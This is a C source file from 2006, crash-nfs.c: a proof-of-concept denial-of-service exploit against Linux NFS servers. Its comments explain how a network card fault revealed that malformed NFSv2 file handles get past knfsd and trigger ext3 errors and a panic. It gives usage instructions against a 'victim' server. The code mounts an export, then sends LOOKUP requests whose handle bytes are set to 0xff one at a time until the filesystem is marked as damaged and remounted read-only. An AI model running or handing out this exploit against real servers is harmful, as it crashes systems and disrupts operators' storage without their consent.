/* This program will generate fatal ext3 panics on any linux */
/* NFS server unfortunate enough to have it pointed at it */

/* How to use it:
 * crash-nfs server exportedpath node 
 *
 *    server          should be the name of the victim NFS server
 *    exportedpath    is a path exported by the server 
 *    node            is a file or directory in exportedpath
 *
 * run the program and you should get an entry in the kernel log of the form
 * EXT3-fs error (device hde3): ext3_get_inode_block: bad inode number: 4294913866 
 * and a panic
 */

/*
 * crash.c:
 *
 * Copyright (c) 2006 James McKenzie 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 *
 */

static char rcsid[] = "$Id: crash-nfs.c,v 1.4 2006/07/17 12:30:28 root Exp $";

/*
 * $Log: crash-nfs.c,v $
 * Revision 1.4  2006/07/17 12:30:28  root
 * *** empty log message ***
 *
 * Revision 1.3  2006/07/17 12:30:01  root
 * *** empty log message ***
 *
 * Revision 1.2  2006/07/17 12:08:37  root
 * *** empty log message ***
 *
 * Revision 1.1  2006/07/17 12:04:34  root
 * *** empty log message ***
 *
 */


/* 
 * We found this rather surprising behaviour when debugging a
 * network card for one of our embedded systems. There was a
 * bus problem that occasionally caused the network card to
 * place random data in the outgoing packets. We were using
 * NFS root, as we hadn't written drivers for the block
 * devices yet, and discovered our Linux NFS servers getting
 * ext3 errors. It turned out that the 3com cards we have in
 * the servers lie about checking UDP checksums, and passed
 * the rubbish to knfsd where it was causing the problem. 
 * 
 * Here's an example one of our widgets (dcm503) is talking
 * to an NFS server (dufftown)
 * 
 * 17:28:38.535011 dcm503.guralp.local.984095109 > dufftown.guralp.local.nfs: 116 
 * lookup fh Unknown/1 "" (DF) (ttl 64, id 0, len 144)
 *                          4500 0090 0000 4000 4011 3d45 0a52 01fa
 *                          c0a8 3024 03ff 0801 007c 8e9c 3aa8 1985
 *                          0000 0000 0000 0002 0001 86a3 0000 0002
 *                          0000 0004 0000 0001 0000 001c 028f 5b0c
 *                          0000 0006 6463 6d35 3033 0000 0000 0000
 *                          0000 0000 0000 0000 0000 0000 0000 0000
 *                          0100 0001 0021 0003 3d26 3d00 4a2f ffff
 *                          3d00 2c08 c923 0000 0000 0000 0000 0000
 *                          0000 0000 000a 6d6f 756e 7470 6f69 6e74
 * 
 * so what's happened here is 4a2f ffff should have been 4a2f
 * xxxx but the network card has missed the clock on the bus
 * and gotten ffff instead
 * 
 * nfsd_dispatch: vers 2 proc 4
 * nfsd: LOOKUP   32: 01000001 03002100 003d263d ffff2f4a 082c003d 000023c9
 * nfsd: nfsd_lookup(fh 32: 01000001 03002100 003d263d ffff2f4a 082c003d 
 * 000023c9, )
 * nfsd: fh_verify(32: 01000001 03002100 003d263d ffff2f4a 082c003d 000023c9)
 * 
 * so here the client does a V2 lookup with a DH which has
 * gotten screwed up by my clients network card, this is
 * received by my server, gets past the UDP checksum code
 * (thank you 3com) and ends up at knfsd.
 * 
 * knfsd passes this to fh_verify which decodes it to be hde3
 * and inode 4294913866 (0xffff2f4a)
 * 
 * that then gets passed to ext3 which then panics.
 * 
 * EXT3-fs error (device hde3): ext3_get_inode_block: bad inode number: 
 * 4294913866
 * 
 * marks the file system as containing an error, and remounts
 * the system read only.
 * 
 * Obviously this is sub optimal, and a fairly horrid DoS
 * since anyone can craft a UDP packet, with a bogus FH in
 * it. Whilst this is for V2_LOOKUP it works for all of the
 * V2 procedures we tried.
 * 
 */

#include "mount.h"
#include "nfs_prot.h"
#include <string.h>


typedef struct
{
  fhandle fh;
} FH;


char *
fhtoa (unsigned char *fh)
{
  int i;
  static char ret[1024];
  char *ptr = ret;

  for (i = 0; i < FHSIZE; ++i)
    {
      if ((i) && (!(i % 4)))
        *(ptr++) = ' ';
      ptr += sprintf (ptr, "%02x", *(fh++));
    }

  return ret;
}

void
nfs (char *host, FH fh, char *file)
{
  int i;
  CLIENT *clnt;

  diropres *result;
  diropargs args;

  clnt = clnt_create (host, NFS_PROGRAM, NFS_VERSION, "udp");
  if (clnt == NULL)
    {
      clnt_pcreateerror (host);
      exit (1);
    }



  memcpy (args.dir.data, fh.fh, sizeof (fh.fh));
  args.name = file;


  result = nfsproc_lookup_2 ((void *) &args, clnt);
  if (result == (void *) NULL)
    {
      clnt_perror (clnt, "call failed");
      exit (1);
    }

  printf ("lookup %s on %s, result=%d\n",
          args.name, fhtoa (result->diropres_u.diropres.file.data),
          result->status);

  if (result->status)
    {
      fprintf (stderr, "%s doesn't exist\n", file);

      exit (1);
    }

  memcpy (fh.fh, result->diropres_u.diropres.file.data, sizeof (fh.fh));

  for (i = 0; i < sizeof (fh.fh); ++i)
    {

      memcpy (args.dir.data, fh.fh, sizeof (fh.fh));
      args.name = "fishsoup";
      args.dir.data[i] = 0xff;

      result = nfsproc_lookup_2 ((void *) &args, clnt);
      if (result == (void *) NULL)
        {
          clnt_perror (clnt, "call failed");
        }
      else
        {

          printf ("lookup %s on %s, result=%d\n",
                  args.name, fhtoa (args.dir.data), result->status);
        }


    }

  clnt_destroy (clnt);
}

FH
mount (char *host, char *path)
{
  CLIENT *clnt;
  FH ret;
  int i;

  fhstatus *mount_ret;

  clnt = clnt_create (host, MOUNTPROG, MOUNTVERS, "udp");

  if (clnt == NULL)
    {
      clnt_pcreateerror (host);
      exit (1);
    }

  mount_ret = mountproc_mnt_1 (&path, clnt);
  if (mount_ret == (fhstatus *) NULL)
    {
      clnt_perror (clnt, "call failed");
    }

  if (mount_ret->fhs_status)
    {
      fprintf (stderr, "mount failed, error number %d\n",
               mount_ret->fhs_status);
      exit (1);
    }

  printf ("server=%s, path=%s, status=%d, fh=%s\n", host, path,
          mount_ret->fhs_status, fhtoa (mount_ret->fhstatus_u.fhs_fhandle));

  memcpy (ret.fh, mount_ret->fhstatus_u.fhs_fhandle, sizeof (ret.fh));

  clnt_destroy (clnt);

  return ret;
}


int
main (int argc, char *argv[])
{
  char *host, *path, *file;
  FH fh;

  if (argc < 4)
    {
      printf ("usage: %s server_host exported_path file\n", argv[0]);
      exit (1);
    }
  host = argv[1];
  path = argv[2];
  file = argv[3];

  fh = mount (host, path);

  nfs (host, fh, file);


  exit (0);
}
